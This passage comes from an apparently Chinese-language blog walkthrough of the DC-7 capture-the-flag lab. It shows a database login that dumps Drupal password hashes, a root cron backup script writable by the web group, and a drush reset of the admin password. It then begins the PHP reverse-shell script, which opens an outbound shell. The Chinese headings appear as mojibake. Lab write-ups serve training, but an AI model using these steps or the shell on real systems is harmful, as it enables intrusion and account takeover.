class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:/var/www/html/sites/default$ mysql -udb7user -pyNv3Po00</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 53</span><br><span class="line">Server version: 10.1.38-MariaDB-0+deb9u1 Debian 9.8</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| d7db               |</span><br><span class="line">| information_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use d7db;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [d7db]&gt; show tables;</span><br><span class="line">+----------------------------------+</span><br><span class="line">| Tables_in_d7db                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| block_content                    |</span><br><span class="line">| block_content__body              |</span><br><span class="line">| block_content_field_data         |</span><br><span class="line">| block_content_field_revision     |</span><br><span class="line">| block_content_revision           |</span><br><span class="line">| block_content_revision__body     |</span><br><span class="line">| cache_bootstrap                  |</span><br><span class="line">| cache_config                     |</span><br><span class="line">| cache_container                  |</span><br><span class="line">| cache_data                       |</span><br><span class="line">| cache_default                    |</span><br><span class="line">| cache_discovery                  |</span><br><span class="line">| cache_dynamic_page_cache         |</span><br><span class="line">| cache_entity                     |</span><br><span class="line">| cache_menu                       |</span><br><span class="line">| cache_page                       |</span><br><span class="line">| cache_render                     |</span><br><span class="line">| cache_toolbar                    |</span><br><span class="line">| cachetags                        |</span><br><span class="line">| config                           |</span><br><span class="line">| file_managed                     |</span><br><span class="line">| file_usage                       |</span><br><span class="line">| flood                            |</span><br><span class="line">| <span class="built_in">history</span>                          |</span><br><span class="line">| key_value                        |</span><br><span class="line">| key_value_expire                 |</span><br><span class="line">| menu_link_content                |</span><br><span class="line">| menu_link_content_data           |</span><br><span class="line">| menu_link_content_field_revision |</span><br><span class="line">| menu_link_content_revision       |</span><br><span class="line">| menu_tree                        |</span><br><span class="line">| node                             |</span><br><span class="line">| node__body                       |</span><br><span class="line">| node__field_image                |</span><br><span class="line">| node__field_tags                 |</span><br><span class="line">| node_access                      |</span><br><span class="line">| node_field_data                  |</span><br><span class="line">| node_field_revision              |</span><br><span class="line">| node_revision                    |</span><br><span class="line">| node_revision__body              |</span><br><span class="line">| node_revision__field_image       |</span><br><span class="line">| node_revision__field_tags        |</span><br><span class="line">| queue                            |</span><br><span class="line">| router                           |</span><br><span class="line">| search_dataset                   |</span><br><span class="line">| search_index                     |</span><br><span class="line">| search_total                     |</span><br><span class="line">| semaphore                        |</span><br><span class="line">| sequences                        |</span><br><span class="line">| sessions                         |</span><br><span class="line">| shortcut                         |</span><br><span class="line">| shortcut_field_data              |</span><br><span class="line">| shortcut_set_users               |</span><br><span class="line">| taxonomy_index                   |</span><br><span class="line">| taxonomy_term__parent            |</span><br><span class="line">| taxonomy_term_data               |</span><br><span class="line">| taxonomy_term_field_data         |</span><br><span class="line">| taxonomy_term_field_revision     |</span><br><span class="line">| taxonomy_term_revision           |</span><br><span class="line">| taxonomy_term_revision__parent   |</span><br><span class="line">| url_alias                        |</span><br><span class="line">| user__roles                      |</span><br><span class="line">| user__user_picture               |</span><br><span class="line">| users                            |</span><br><span class="line">| users_data                       |</span><br><span class="line">| users_field_data                 |</span><br><span class="line">| watchdog                         |</span><br><span class="line">+----------------------------------+</span><br><span class="line">67 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [d7db]&gt; select * from users\G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">     uid: 0</span><br><span class="line">    uuid: e813638d-3eb3-4212-af40-171dd51023e9</span><br><span class="line">langcode: en</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">     uid: 1</span><br><span class="line">    uuid: fd93872d-a854-44cd-bb08-eb9a11e46492</span><br><span class="line">langcode: en</span><br><span class="line">*************************** 3. row ***************************</span><br><span class="line">     uid: 2</span><br><span class="line">    uuid: 68803de9-fc7b-4b7b-bce8-d04f11ac4c8a</span><br><span class="line">langcode: en</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR: No query specified</span><br><span class="line"></span><br><span class="line">MariaDB [d7db]&gt; select * from users_field_data\G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">                     uid: 0</span><br><span class="line">                langcode: en</span><br><span class="line">      preferred_langcode: en</span><br><span class="line">preferred_admin_langcode: NULL</span><br><span class="line">                    name: </span><br><span class="line">                    pass: NULL</span><br><span class="line">                    mail: NULL</span><br><span class="line">                timezone: </span><br><span class="line">                  status: 0</span><br><span class="line">                 created: 1567054076</span><br><span class="line">                 changed: 1567054076</span><br><span class="line">                  access: 0</span><br><span class="line">                   login: 0</span><br><span class="line">                    init: NULL</span><br><span class="line">        default_langcode: 1</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">                     uid: 1</span><br><span class="line">                langcode: en</span><br><span class="line">      preferred_langcode: en</span><br><span class="line">preferred_admin_langcode: NULL</span><br><span class="line">                    name: admin</span><br><span class="line">                    pass: <span class="variable">$S</span><span class="variable">$Ead</span>.KmIcT/yfKC.1H53aDPJasaD7o.ioEGiaPy1lLyXXAJC/Qi4F</span><br><span class="line">                    mail: admin@example.com</span><br><span class="line">                timezone: Australia/Melbourne</span><br><span class="line">                  status: 1</span><br><span class="line">                 created: 1567054076</span><br><span class="line">                 changed: 1567054076</span><br><span class="line">                  access: 1567098850</span><br><span class="line">                   login: 1567098643</span><br><span class="line">                    init: admin@example.com</span><br><span class="line">        default_langcode: 1</span><br><span class="line">*************************** 3. row ***************************</span><br><span class="line">                     uid: 2</span><br><span class="line">                langcode: en</span><br><span class="line">      preferred_langcode: en</span><br><span class="line">preferred_admin_langcode: en</span><br><span class="line">                    name: dc7user</span><br><span class="line">                    pass: <span class="variable">$S</span><span class="variable">$EKe0kuKQvFhgFnEYMpq</span>.mRtbl/TQ5FmEjCDxbu0HIHaO0/U.YFjI</span><br><span class="line">                    mail: dc7user@blah.com</span><br><span class="line">                timezone: Australia/Brisbane</span><br><span class="line">                  status: 1</span><br><span class="line">                 created: 1567057938</span><br><span class="line">                 changed: 1567057938</span><br><span class="line">                  access: 0</span><br><span class="line">                   login: 0</span><br><span class="line">                    init: dc7user@blah.com</span><br><span class="line">        default_langcode: 1</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR: No query specified</span><br><span class="line"></span><br><span class="line">MariaDB [d7db]&gt; </span><br></pre></td></tr></table></figure><h2 id="0x06æŸ¥çœ‹é‚®ä»¶"><a href="#0x06æŸ¥çœ‹é‚®ä»¶" class="headerlink" title="0x06æŸ¥çœ‹é‚®ä»¶"></a>0x06æŸ¥çœ‹é‚®ä»¶</h2><p><code>å‘ç°ä¸€ä¸ªå¤‡ä»½è„šæœ¬/opt/scripts/backups.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">cd</span> /var/mail</span><br><span class="line">dc7user@dc-7:/var/mail$ ls</span><br><span class="line">dc7user</span><br><span class="line">dc7user@dc-7:/var/mail$ cat dc7user </span><br><span class="line">From root@dc-7 Fri Aug 28 20:00:13 2020</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Fri, 28 Aug 2020 20:00:13 +1000</span><br><span class="line">Received: from root by dc-7 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1kBbB7-0000HQ-RB</span><br><span class="line">        <span class="keyword">for</span> root@dc-7; Fri, 28 Aug 2020 20:00:13 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/<span class="built_in">local</span>/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1kBbB7-0000HQ-RB@dc-7&gt;</span><br><span class="line">Date: Fri, 28 Aug 2020 20:00:13 +1000</span><br><span class="line"></span><br><span class="line">rm: cannot remove <span class="string">&#x27;/home/dc7user/backups/*&#x27;</span>: No such file or directory</span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br><span class="line">From root@dc-7 Fri Aug 28 20:15:05 2020</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Fri, 28 Aug 2020 20:15:05 +1000</span><br><span class="line">Received: from root by dc-7 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1kBbPV-0000I3-Sk</span><br><span class="line">        <span class="keyword">for</span> root@dc-7; Fri, 28 Aug 2020 20:15:05 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/<span class="built_in">local</span>/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1kBbPV-0000I3-Sk@dc-7&gt;</span><br><span class="line">Date: Fri, 28 Aug 2020 20:15:05 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br><span class="line">From root@dc-7 Fri Aug 28 20:30:06 2020</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Fri, 28 Aug 2020 20:30:06 +1000</span><br><span class="line">Received: from root by dc-7 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1kBbe2-0000K5-2D</span><br><span class="line">        <span class="keyword">for</span> root@dc-7; Fri, 28 Aug 2020 20:30:06 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/<span class="built_in">local</span>/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1kBbe2-0000K5-2D@dc-7&gt;</span><br><span class="line">Date: Fri, 28 Aug 2020 20:30:06 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br><span class="line">dc7user@dc-7:/var/mail$</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹/opt/scripts/backups.shï¼Œå±ç»„ä¸ºwww-data</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:~$ ls -l /opt/scripts/backups.sh </span><br><span class="line">-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh</span><br><span class="line">dc7user@dc-7:~$ cat /opt/scripts/backups.sh      </span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br><span class="line">dc7user@dc-7:~$</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹drushå‚æ•°ï¼Œå‘ç°å®ƒå¯ä»¥ä¿®æ”¹drupalç”¨æˆ·å¯†ç </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:~$ drush | grep user</span><br><span class="line"> sanitize:user-fields  Sanitize string fields associated with the user.                                               </span><br><span class="line"> (sanitize-user-field                                                                                                 </span><br><span class="line">User commands: (user)</span><br><span class="line"> user-add-role (urol,  Add a role to the specified user accounts.                                    </span><br><span class="line"> user:add:role)                                                                                      </span><br><span class="line"> user-block (ublk,     Block the specified user(s).                                                  </span><br><span class="line"> user:block)                                                                                         </span><br><span class="line"> user-cancel (ucan,    Cancel a user account with the specified name.                                </span><br><span class="line"> user:cancel)                                                                                        </span><br><span class="line"> user-create (ucrt,    Create a user account with the specified name.                                </span><br><span class="line"> user:create)                                                                                        </span><br><span class="line"> user-information      Print information about the specified user(s).                                </span><br><span class="line"> user:information)                                                                                   </span><br><span class="line"> user-login (uli,      Display a one time login link <span class="keyword">for</span> the given user account (defaults to uid 1). </span><br><span class="line"> user:login)                                                                                         </span><br><span class="line"> user-password (upwd,  (Re)Set the password <span class="keyword">for</span> the user account with the specified name.            </span><br><span class="line"> user:password)                                                                                      </span><br><span class="line"> user-remove-role      Remove a role from the specified user accounts.                               </span><br><span class="line"> user:remove:role)                                                                                   </span><br><span class="line"> user-unblock (uublk,  Unblock the specified user(s).                                                </span><br><span class="line"> user:unblock)</span><br><span class="line">dc7user@dc-7:~$</span><br></pre></td></tr></table></figure><p><code>ä¿®æ”¹adminå¯†ç </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">cd</span> /var/www/html/</span><br><span class="line">dc7user@dc-7:/var/www/html$ drush user-password admin --password=<span class="string">&quot;admin&quot;</span></span><br><span class="line">Changed password <span class="keyword">for</span> admin                                                                                                             [success]</span><br><span class="line">dc7user@dc-7:/var/www/html$ </span><br></pre></td></tr></table></figure><h2 id="0x07-ç™»å…¥"><a href="#0x07-ç™»å…¥" class="headerlink" title="0x07.ç™»å…¥"></a>0x07.ç™»å…¥</h2><p><code>å‘ç°å¯ä»¥å®‰è£…æ‰©å±•æ’ä»¶</code></p><img src="/2020/08/28/DC-7/image-20200828202529102.png" class><p><code>å®‰è£…phpæ‰©å±•æ’ä»¶</code><span class="exturl" data-url="aHR0cHM6Ly93d3cuZHJ1cGFsLm9yZy9wcm9qZWN0L3BocA==">å®‰è£…åœ°å€<i class="fa fa-external-link-alt"></i></span></p><img src="/2020/08/28/DC-7/image-20200828202838728.png" class><p><code>å‡ºç°ä¸‹å›¾å³ä¸ºæˆåŠŸ</code></p><img src="/2020/08/28/DC-7/image-20200828203016424.png" class><p><code>è¿™é‡Œä¸€å®šè¦å‹¾é€‰</code></p><img src="/2020/08/28/DC-7/image-20200828203116659.png" class><p><code>å®‰è£…</code></p><img src="/2020/08/28/DC-7/image-20200828203203476.png" class><p><code>ä¸‹å›¾å³ä¸ºæˆåŠŸ</code></p><img src="/2020/08/28/DC-7/image-20200828203241818.png" class><h2 id="0x07-åå¼¹shell"><a href="#0x07-åå¼¹shell" class="headerlink" title="0x07.åå¼¹shell"></a>0x07.åå¼¹shell</h2><h3 id="1-ç¼–å†™reverse-shell"><a href="#1-ç¼–å†™reverse-shell" class="headerlink" title="1.ç¼–å†™reverse-shell"></a>1.ç¼–å†™reverse-shell</h3><p><code>æœ¬æ¬¡ä½¿ç”¨/usr/share/webshells/php/php-reverse-shell.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// php-reverse-shell - A Reverse Shell implementation <span class="keyword">in</span> PHP</span><br><span class="line">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// This tool may be used <span class="keyword">for</span> legal purposes only.  Users take full responsibility</span><br><span class="line">// <span class="keyword">for</span> any actions performed using this tool.  The author accepts no liability</span><br><span class="line">// <span class="keyword">for</span> damage caused by this tool.  If these terms are not acceptable to you, <span class="keyword">then</span></span><br><span class="line">// <span class="keyword">do</span> not use this tool.</span><br><span class="line">//</span><br><span class="line">// In all other respects the GPL version 2 applies:</span><br><span class="line">//</span><br><span class="line">// This program is free software; you can redistribute it and/or modify</span><br><span class="line">// it under the terms of the GNU General Public License version 2 as</span><br><span class="line">// published by the Free Software Foundation.</span><br><span class="line">//</span><br><span class="line">// This program is distributed <span class="keyword">in</span> the hope that it will be useful,</span><br><span class="line">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line">// GNU General Public License <span class="keyword">for</span> more details.</span><br><span class="line">//</span><br><span class="line">// You should have received a copy of the GNU General Public License along</span><br><span class="line">// with this program; <span class="keyword">if</span> not, write to the Free Software Foundation, Inc.,</span><br><span class="line">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span><br><span class="line">//</span><br><span class="line">// This tool may be used <span class="keyword">for</span> legal purposes only.  Users take full responsibility</span><br><span class="line">// <span class="keyword">for</span> any actions performed using this tool.  If these terms are not acceptable to</span><br><span class="line">// you, <span class="keyword">then</span> <span class="keyword">do</span> not use this tool.</span><br><span class="line">//</span><br><span class="line">// You are encouraged to send comments, improvements or suggestions to</span><br><span class="line">// me at pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// Description</span><br><span class="line">// -----------</span><br><span class="line">// This script will make an outbound TCP connection to a hardcoded IP and port.</span><br><span class="line">// The recipient will be given a shell running as the current user (apache normally).</span><br><span class="line">//</span><br><span class="line">// Limitations</span><br><span class="line">// -----------</span><br><span class="line">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span><br><span class="line">// Use of stream_select() on file descriptors returned by proc_open() will fail and <span class="built_in">return</span> FALSE under Windows.</span><br><span class="line">// Some compile-time options are needed <span class="keyword">for</span> daemonisation (like pcntl, posix).  These are rarely available.</span><br><span class="line">//</span><br><span class="line">// Usage</span><br><span class="line">// -----</span><br><span class="line">// See http://pentestmonkey.net/tools/php-reverse-shell <span class="keyword">if</span> you get stuck.</span><br><span class="line"></span><br><span class="line">set_time_limit (0);</span><br><span class="line"><span class="variable">$VERSION</span> = <span 